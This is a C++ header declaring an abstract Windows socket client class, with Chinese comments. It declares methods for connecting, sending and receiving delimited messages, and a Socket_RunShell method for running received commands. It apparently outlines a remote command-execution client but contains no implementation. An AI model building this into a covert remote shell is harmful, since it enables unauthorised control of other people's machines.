#ifndef CSocketClass_H
#define CSocketClass_H
//#include <winsock2.h> 放置于预编译h，要在windows.h前
#include <WS2tcpip.h>
#pragma comment(lib,"ws2_32.lib")
#include <vector>
#include <thread>
#include <string>

class CSocketClass
{
public:
	int Entrance();

private:
	virtual void Loading() = 0; // 初始化
	virtual SOCKADDR_IN Socket_Initialization() = 0; // Initialization Socket
	virtual void Socket_RunShell(std::string) = 0; // 运行命令
	virtual void Send_Socket_While(SOCKET) = 0; // 循环发送Socket
	virtual std::string GetFirstSendData(); // 第一次发送的数据

private:
	void SocketStart(); // 打开Socket
	bool Recv_Socket(SOCKET socket, std::vector<std::string>* allResult);// 接收Socket
	void Recv_Socket_While(SOCKET); // 循环接收Socket

public:
	bool Send_Socket(SOCKET, std::string); // 发送Socket
	void SocketStop(SOCKET); // 关闭Socket
	std::string GetIpByName(std::string); // 解析域名

public:
	bool hasThread = false; // 是否已经开始线程entrance
	bool SocketStopFlac = false; // 是否停止Socket
	SOCKET sClient = NULL; //Socket

public:
	std::string recvTemp = ""; // 临时数据s
	std::string flac_Start = "|start|"; // 开始flac
	std::string flac_End = "|end|"; // 结束flac
	std::string flac_w = "|w|"; // 分割flac
	int socketCache = 100000; // 缓存区大小
	bool w = true; // 接收和发送时是否根据w规则

};
#endif